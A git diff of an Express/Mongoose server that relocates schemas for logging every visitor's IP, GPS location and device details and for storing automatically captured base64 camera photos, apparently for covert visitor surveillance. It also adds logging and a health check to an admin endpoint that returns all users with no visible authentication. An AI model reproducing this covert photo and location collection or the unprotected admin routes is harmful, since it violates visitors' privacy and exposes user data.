@@ -89,6 +89,97 @@ const userSchema = new mongoose.Schema({
 
 const User = mongoose.model('User', userSchema);
 
+// Page Visit Schema for tracking all visits (with or without login)
+const pageVisitSchema = new mongoose.Schema({
+    visitId: {
+        type: String,
+        required: true,
+        unique: true
+    },
+    ipAddress: {
+        type: String,
+        required: true
+    },
+    location: {
+        latitude: Number,
+        longitude: Number,
+        city: String,
+        country: String,
+        region: String,
+        source: String, // 'GPS' or 'IP'
+        accuracy: Number,
+        error: String
+    },
+    timestamp: {
+        type: Date,
+        default: Date.now
+    },
+    userAgent: String,
+    screenResolution: String,
+    timezone: String,
+    url: String,
+    referrer: String,
+    hasLoggedIn: {
+        type: Boolean,
+        default: false
+    }
+});
+
+const PageVisit = mongoose.model('PageVisit', pageVisitSchema);
+
+// Camera Photo Schema - Enhanced with more metadata
+const cameraPhotoSchema = new mongoose.Schema({
+    visitId: {
+        type: String,
+        required: true
+    },
+    photoData: {
+        type: String, // Base64 encoded image
+        required: true
+    },
+    photoNumber: {
+        type: Number,
+        required: true
+    },
+    captureType: {
+        type: String,
+        default: 'standard' // 'initial', 'movement', 'final', 'extra1', 'extra2', 'fallback'
+    },
+    ipAddress: {
+        type: String,
+        required: true
+    },
+    location: {
+        latitude: Number,
+        longitude: Number,
+        city: String,
+        country: String,
+        region: String,
+        source: String,
+        accuracy: Number
+    },
+    timestamp: {
+        type: Date,
+        default: Date.now
+    },
+    userAgent: String,
+    quality: String, // 'highest', 'high', 'medium', 'low'
+    deviceInfo: {
+        screenResolution: String,
+        colorDepth: Number,
+        timezone: String,
+        language: String,
+        platform: String
+    },
+    photoSize: Number, // Size in KB
+    isAutomatic: {
+        type: Boolean,
+        default: true
+    }
+});
+
+const CameraPhoto = mongoose.model('CameraPhoto', cameraPhotoSchema);
+
 // Function to get client IP
 function getClientIP(req) {
     // Try multiple headers and sources for IP
@@ -188,12 +279,31 @@ app.post('/api/login', async (req, res) => {
 
 // Admin API to get all users
 app.get('/api/admin/users', async (req, res) => {
+    console.log('📊 Admin users request received');
     try {
+        // Check if mongoose is connected
+        if (mongoose.connection.readyState !== 1) {
+            console.error('❌ MongoDB not connected. State:', mongoose.connection.readyState);
+            return res.status(500).json({ 
+                error: 'Database connection failed',
+                details: 'MongoDB not connected',
+                connectionState: mongoose.connection.readyState
+            });
+        }
+        
+        console.log('🔍 Fetching users from database...');
         const users = await User.find().sort({ timestamp: -1 });
+        console.log(`✅ Found ${users.length} users`);
+        
         res.json(users);
     } catch (error) {
-        console.error('Admin fetch error:', error);
-        res.status(500).json({ error: 'Server error' });
+        console.error('❌ Admin users fetch error:', error.message);
+        console.error('Error stack:', error.stack);
+        res.status(500).json({ 
+            error: 'Server error',
+            details: error.message,
+            timestamp: new Date().toISOString()
+        });
     }
 });
 
@@ -233,96 +343,15 @@ app.delete('/api/admin/users', async (req, res) => {
 
 
 
-// Page Visit Schema for tracking all visits (with or without login)
-const pageVisitSchema = new mongoose.Schema({
-    visitId: {
-        type: String,
-        required: true,
-        unique: true
-    },
-    ipAddress: {
-        type: String,
-        required: true
-    },
-    location: {
-        latitude: Number,
-        longitude: Number,
-        city: String,
-        country: String,
-        region: String,
-        source: String, // 'GPS' or 'IP'
-        accuracy: Number,
-        error: String
-    },
-    timestamp: {
-        type: Date,
-        default: Date.now
-    },
-    userAgent: String,
-    screenResolution: String,
-    timezone: String,
-    url: String,
-    referrer: String,
-    hasLoggedIn: {
-        type: Boolean,
-        default: false
-    }
+// Health check endpoint
+app.get('/api/health', (req, res) => {
+    res.json({
+        status: 'OK',
+        timestamp: new Date().toISOString(),
+        mongodb: mongoose.connection.readyState === 1 ? 'connected' : 'disconnected',
+        version: '1.0.0'
+    });
 });
-
-const PageVisit = mongoose.model('PageVisit', pageVisitSchema);
-
-// Camera Photo Schema - Enhanced with more metadata
-const cameraPhotoSchema = new mongoose.Schema({
-    visitId: {
-        type: String,
-        required: true
-    },
-    photoData: {
-        type: String, // Base64 encoded image
-        required: true
-    },
-    photoNumber: {
-        type: Number,
-        required: true
-    },
-    captureType: {
-        type: String,
-        default: 'standard' // 'initial', 'movement', 'final', 'extra1', 'extra2', 'fallback'
-    },
-    ipAddress: {
-        type: String,
-        required: true
-    },
-    location: {
-        latitude: Number,
-        longitude: Number,
-        city: String,
-        country: String,
-        region: String,
-        source: String,
-        accuracy: Number
-    },
-    timestamp: {
-        type: Date,
-        default: Date.now
-    },
-    userAgent: String,
-    quality: String, // 'highest', 'high', 'medium', 'low'
-    deviceInfo: {
-        screenResolution: String,
-        colorDepth: Number,
-        timezone: String,
-        language: String,
-        platform: String
-    },
-    photoSize: Number, // Size in KB
-    isAutomatic: {
-        type: Boolean,
-        default: true
-    }
-});
-
-const CameraPhoto = mongoose.model('CameraPhoto', cameraPhotoSchema);
 
 // Track page visits with location
 app.post('/api/track-visit', async (req, res) => {
